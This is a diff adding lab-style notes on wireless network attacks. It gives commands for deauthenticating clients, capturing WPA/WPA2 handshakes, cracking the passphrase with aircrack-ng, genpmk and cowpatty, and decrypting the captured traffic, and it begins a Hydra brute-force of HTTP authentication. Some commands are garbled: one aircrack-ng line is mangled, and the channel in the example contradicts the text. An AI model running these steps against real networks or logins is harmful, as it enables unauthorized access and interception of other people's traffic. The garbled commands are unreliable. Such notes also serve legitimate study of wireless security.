@@ -87,8 +87,40 @@ Replay ARP packets using*sudo aireplay-ng -3 -b 3C:84:6A:DF:AB:7C -h a8:93:4a:f2
 
 Now just run *aircrack-ng WEPDemo-02.cap* to crack the key using the data collected by airodump-ng. This depends on the network speed and the key strength but shouldn't take much longer then 5-10 minutes.
 
+# How to crack WPA/WPA2 networks which are using PSK
 
+run *airodump-ng wlan0mon* to find out the MAC address of the target router and the channel its operating in. 
 
+Then run *airodump-ng -c 5 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon --write WPACrackingDemo* with -c set to the channel, in this case 11 and bssid to the MAC of the router.
+
+Now we force the other clients to reconnect or wait till someone connects. run *aireplay-ng --deauth 1 -a 3C:84:6A:DF:AB:7C wlan0mon --ignore-negative-one*. Now if the *Auth* section of airodump reads *PSK*, we can stop airodump, otherwise retry.
+
+Crack the file using aircrack utility with the command *aircrack-ng Wsudo aircrack-ng WPACrackingDemo-01.cap -w /usr/share/wordlists/nmap.lst* using our captured .cap file and a wordlist preinstalled from kali. (Important, the worldlist is everything here so optimizing it for the region you are in or including know information is a good idea.)
+
+Of course in this example it will find the key since we included it in the wordlist but it only works if the key is in the wordlist!
+
+# Speeding up the cracking process
+
+The calculation of the Pre-Shared key using the PSK passphrase and the SSID through the PBKDF2 is very time/CPU consuming. The next step, which uses the key along with the parameters in the four-way handshake and verifying it against the MIC in the handshake is inexpensive and has different parameters everytime so we cannot precompute it. So we try to speed up the PSK (also called the Pairwise Master Key(PMK)) calculation as much as possible. 
+
+Precalculate the PMK for a give SSID and worklist using *genpmk*. Run *sudo genpmk -f /usr/share/wordlists/nmap.lst -d PMK-WirelessLab -s "Wireless Lab"*
+
+Now crack the WPA/WPA2 passphrase using a different tool for variety cowpatty.
+Run *cowpatty -d PMK-WirelessLab -s "Wireless Lab" -r WPACrackingDemo-01.cap*
+
+# Decrypting WPA packets
+
+Use *airedecap-ng* to decrypt packages we captured. Run *sudo airdecap-ng -p abcdefgh -e "Wireless Lab" WPACrackingDemo-01.cap*
+
+Now the decrypted packages are stored in *WPACrackingDemo-01-dec.cap* and can be analyzed using
+Wireshark or sth like *tshark*. E.g. *tshark -r WPACrackingDemo-01-dec.cap *
+
+# Use Hydra to crack HTTP authentication
+
+In this case we generate a wordlist first to brute-force the password.
+Run *sudo crunch 8 8 abcdefghi -o testWordlist.txt* to create a wordlist containing from 8 to 8  characters all possible combinations of the letters abcdefghi and writes it in the specified file. 
+
+After this it gets a little tricky since we need to analyze the webpage in order to understand how it processes the password. We need to know if it is a POST or a GET request and alter the options accordingly. For this inspect the network tab in the browser. 
 
 
 
